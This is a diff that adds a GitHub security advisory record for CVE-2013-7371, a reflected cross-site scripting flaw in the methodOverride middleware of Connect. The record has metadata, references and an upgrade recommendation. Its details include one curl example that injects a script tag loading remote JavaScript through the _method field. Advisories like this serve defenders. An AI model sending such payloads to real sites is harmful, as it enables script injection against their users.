@@ -1,0 +1,93 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-6w62-83g6-rfhj",
+  "modified": "2023-08-17T22:50:28Z",
+  "published": "2022-05-05T00:29:11Z",
+  "aliases": [
+    "CVE-2013-7371"
+  ],
+  "summary": "Node Connect Reflected Cross-Site Scripting in Sencha Labs Connect middleware",
+  "details": "node-connect before 2.8.2 has cross site scripting in Sencha Labs Connect middleware (vulnerability due to incomplete fix for CVE-2013-7370)\n\n### Overview\nConnect is a stack of middleware that is executed in order in each request.\n\nThe \"methodOverride\" middleware allows the http post to override the method of the request with the value of the \"_method\" post key or with the header \"x-http-method-override\".\n\nBecause the user post input was not checked, req.method could contain any kind of value. Because the req.method did not match any common method VERB, connect answered with a 404 page containing the \"Cannot `[method]` `[url]`\" content. The method was not properly encoded for output in the browser.\n\n\n### Example:\n```\n~ curl \"localhost:3000\" -d \"_method=<script src=http://nodesecurity.io/xss.js></script>\"\nCannot <SCRIPT SRC=HTTP://NODESECURITY.IO/XSS.JS></SCRIPT> /\n```\n\n### Recommendation\n\nUpdate to the newest version of Connect or disable methodOverride. It is not possible to avoid the vulnerability if you have enabled this middleware in the top of your stack.\n\n### Credit:\nSergio Arcos",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "connect"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "2.8.2"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2013-7371"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/senchalabs/connect/issues/831"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/senchalabs/connect/commit/126187c4e12162e231b87350740045e5bb06e93a"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/senchalabs/connect/commit/277e5aad6a95d00f55571a9a0e11f2fa190d8135"
+    },
+    {
+      "type": "WEB",
+      "url": "https://access.redhat.com/security/cve/cve-2013-7371"
+    },
+    {
+      "type": "WEB",
+      "url": "https://exchange.xforce.ibmcloud.com/vulnerabilities/92710"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/senchalabs/connect"
+    },
+    {
+      "type": "WEB",
+      "url": "https://nodesecurity.io/advisories/methodOverride_Middleware_Reflected_Cross-Site_Scripting"
+    },
+    {
+      "type": "WEB",
+      "url": "https://security-tracker.debian.org/tracker/CVE-2013-7371"
+    },
+    {
+      "type": "WEB",
+      "url": "http://www.openwall.com/lists/oss-security/2014/04/21/2"
+    },
+    {
+      "type": "WEB",
+      "url": "http://www.openwall.com/lists/oss-security/2014/05/13/1"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-79"
+    ],
+    "severity": "MODERATE",
+    "github_reviewed": true,
+    "github_reviewed_at": "2023-08-17T22:50:28Z",
+    "nvd_published_at": "2019-12-11T15:15:00Z"
+  }
+}
